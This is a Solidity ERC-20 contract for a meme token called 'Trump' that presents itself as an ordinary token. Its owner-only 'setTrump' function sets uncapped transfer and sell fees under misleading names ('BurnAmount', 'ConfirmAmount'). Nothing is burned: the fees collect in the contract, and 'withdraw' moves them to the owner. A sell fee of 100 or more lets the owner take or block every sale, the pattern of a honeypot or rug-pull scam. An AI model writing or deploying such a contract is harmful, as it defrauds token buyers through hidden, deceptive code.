// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

contract Trump {
    string public constant name = "Trump";
    string public constant symbol = "Trump";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 public BurnAmount = 0;
    uint256 public ConfirmAmount = 0;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
        
    error Permissions();
        
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address private pair;
    address private owner;

    bool private tradingOpen;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(tradingOpen || from == owner || to == owner);

        if (!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if (from != address(this)) {
            uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 100;
            amount -= FinalAmount;
            balanceOf[address(this)] += FinalAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == owner, "Only the owner can open trading");
        require(!tradingOpen, "Trading already open");
        tradingOpen = true;        
    }

    function setTrump(uint256 newBurn, uint256 newConfirm) external {
        require(msg.sender == owner, "Only the owner can set WEN parameters");
        BurnAmount = newBurn;
        ConfirmAmount = newConfirm;
    }

    function withdraw() external {
        require(msg.sender == owner, "Only the owner can withdraw fees");
        uint256 fees = balanceOf[address(this)];
        balanceOf[address(this)] = 0;
        balanceOf[owner] += fees;
        emit Transfer(address(this), owner, fees);
    }
}
